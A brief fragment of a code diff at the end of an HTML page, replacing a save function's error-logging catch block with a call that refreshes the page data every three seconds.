-  } catch(e) { log('Save failed: ' + e.message, 'error'); }
-}
+refresh();setInterval(refresh,3000);
 </script>
 </body>
 </html>
